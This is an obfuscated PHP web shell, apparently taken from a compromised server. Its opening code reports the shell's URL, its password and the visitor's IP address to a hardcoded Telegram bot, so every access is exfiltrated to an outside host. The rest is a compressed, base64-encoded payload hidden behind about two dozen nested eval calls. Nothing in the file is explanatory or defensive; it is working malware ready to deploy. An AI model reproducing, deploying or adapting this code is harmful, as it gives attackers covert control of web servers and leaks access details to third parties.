<?php
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
function _N6uR($_pL67z)
{
    $_pL67z = substr($_pL67z, (int) hex2bin("373139"));
    $_pL67z = substr($_pL67z, (int) hex2bin("30"), (int) hex2bin("2d363037"));
    return $_pL67z;
}
$_3m1lC = "_N6uR";
$_UV0Hr4ig = "base64_decode";
function _Kt576skQhPQDoqZC($_RQZEcL2WM)
{
    global $_3m1lC;
    global $_UV0Hr4ig;
    return strrev(gzinflate($_UV0Hr4ig(_N6uR($_RQZEcL2WM))));
}
eval(
    eval(
        eval(
            eval(
                eval(
                    eval(
                        eval(
                            eval(
                                eval(
                                    eval(
                                        eval(
                                            eval(
                                                eval(
                                                    eval(
                                                        eval(
                                                            eval(
                                                                eval(
                                                                    eval(
                                                                        eval(
                                                                            eval(
                                                                                eval(
                                                                                    eval(
                                                                                        eval(
                                                                                            _Kt576skQhPQDoqZC(
                                                                                                "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"
                                                                                            )
                                                                                        )
                                                                                    )
                                                                                )
                                                                            )
                                                                        )
                                                                    )
                                                                )
                                                            )
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            )
        )
    )
);
?>